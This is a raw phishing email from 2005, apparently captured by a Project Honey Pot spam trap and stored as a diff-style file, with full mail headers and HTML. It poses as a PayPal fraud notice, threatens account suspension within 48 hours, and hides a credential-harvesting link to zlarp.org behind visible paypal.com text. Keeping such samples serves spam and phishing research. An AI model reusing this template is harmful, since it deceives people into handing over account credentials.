@@ -1,0 +1,132 @@
+Received: from lrm104.securednshost.com (205.243.144.81)
+  by projecthoneypotmailserver with SMTP; 3 Jul 2005 13:53:14 -0000
+Received: from nobody by lrm104.securednshost.com with local (Exim 4.43)
+	id 1Dp4uH-0005eU-Qk
+	for projecthoneypot@projecthoneypot.org; Sun, 03 Jul 2005 08:53:13 -0500
+To: projecthoneypot@projecthoneypot.org
+Subject: Security Center Advisory
+From: PayPal<paypal@email.paypal.com>
+Content-Type: text/html
+Message-Id: <E1Dp4uH-0005eU-Qk@lrm104.securednshost.com>
+Date: Sun, 03 Jul 2005 08:53:13 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - lrm104.securednshost.com
+X-AntiAbuse: Original Domain - avernus.mithrandi.za.net
+X-AntiAbuse: Originator/Caller UID/GID - [99 995] / [47 12]
+X-AntiAbuse: Sender Address Domain - lrm104.securednshost.com
+X-Source: /usr/local/bin/php
+X-Source-Args: php paypal.php 
+X-Source-Dir: /dev/shm/ . . . /trimite
+
+
+<html>
+<body>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+</head>
+
+<div id=message>
+<table cellpadding=0 cellspacing=0 border=0 width="100%""><tr><td>
+
+
+<table cellSpacing="0" cellPadding="0" width="600" align="center" border="0">
+  <tbody>
+    <tr>
+      <td><A href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal"
+border="0" width="255" height="35"></A></td>
+    </tr>
+    <tr>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><font color="#000000" size="3" face="Arial, Helvetica, sans-serif"><strong>***Paypal Safe
+Department Notice***</strong></font></td>
+    </tr>
+    <tr>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+<table cellSpacing="0" cellPadding="5" width="600" align="center" border="0">
+  <tbody>
+    <tr>
+      <td height="259" vAlign="top"> <p>              <font size="2" face="Arial, Helvetica,
+sans-serif"><strong>PayPal Fraud Mediation Request</strong><br>
+</font></font></p>
+        <p><font size="2"> </font><font size="2" face="Arial, Helvetica, sans-serif">You have recieved this email because of </font><font size="2"><font face="Arial, Helvetica, sans-serif">some unusual activity in your account.</font><font size="2"><font face="Arial, Helvetica, sans-serif">In accordance with PayPal's User Agreement and to ensure that your account has not been compromised, access to your account was limited. Your account access will remain limited until this issue has been resolved.</font></font></font></p>
+        <p><font size="2" face="Arial, Helvetica, sans-serif">          THE FRAUD ALERT ID CODE
+CONTAINED IN THIS MESSAGE WILL BE ATTACHED IN
+          OUR FRAUD MEDIATION REQUEST FORM, IN ORDER TO VERIFY YOUR PAYPAL ACCOUNT
+REGISTRATION INFORMATIONS.</font></p>
+        <p><font size="2" face="Arial, Helvetica, sans-serif"><strong>Fraud Alert ID CODE:
+00937614</strong><br>
+            <font size="1" face="Verdana, Arial, Helvetica, sans-serif">(Please save this Fraud Alert ID Code
+for your reference.</font>)<br>
+          <br>
+          To help speed up this process,
+          please access the following form to complete the verification of your PayPal account registration
+informations:</font></p>
+        <p><strong><b><a 
+href="http://zlarp.org/paypal/">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></b></strong></p>
+        <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><p><font size="1">.</font></p>            </td>
+          </tr>
+          <tr>
+            <td><table width="100%"  border="0">
+              <tr>
+                <td bgcolor="#E6E6FF"><font size="2" face="Arial, Helvetica, sans-serif"><strong>Please Note:
+</strong><br>
+                  If we do not receive the appropriate PayPal account verification within 48 hours, then we will
+assume this PayPal account is fraudulent and will be suspended. <br>
+                  The purpose of this verification is to ensure that your PayPal account has not been fraudulently
+used and to combat the fraud from our community.</font></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table>
+        <p><font size="2" face="Arial, Helvetica, sans-serif"><font color="#000000">We appreciate your
+support and understanding, as we work together to keep PayPal a safe place to send money.</font></font><font
+color="#000000" size="2" face="Arial, Helvetica, sans-serif"><BR>
+          <BR>
+          <b>Thank you for using PayPal!<br>
+The PayPal Team</b></font><font size="2" face="Arial, Helvetica, sans-serif"><br>
+          <br>
+          <font color="#999999" size="1"> Please do not reply to this e-mail
+            as this is only a notification. Mail sent to this address cannot be
+      answered. </font></font></p>
+        </td>
+    </tr>
+    <tr>
+      <td align="middle" ><p align="center"><font color="#000000" size="1" face="Arial,
+Helvetica, sans-serif"><Br>
+          <br>
+          </font><font size="-1">Copyright &copy; 1999-2005 PayPal. All rights reserved.</font><br>
+        </p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+
+</td></tr></table>
+</div>
+
+</td></tr></table>
+
+  
+
+</td></tr></table>
+</div>
+
+</td></tr></table>
+
+
+
+</td></tr></table>
+</div>
+</body>
+</html>
+
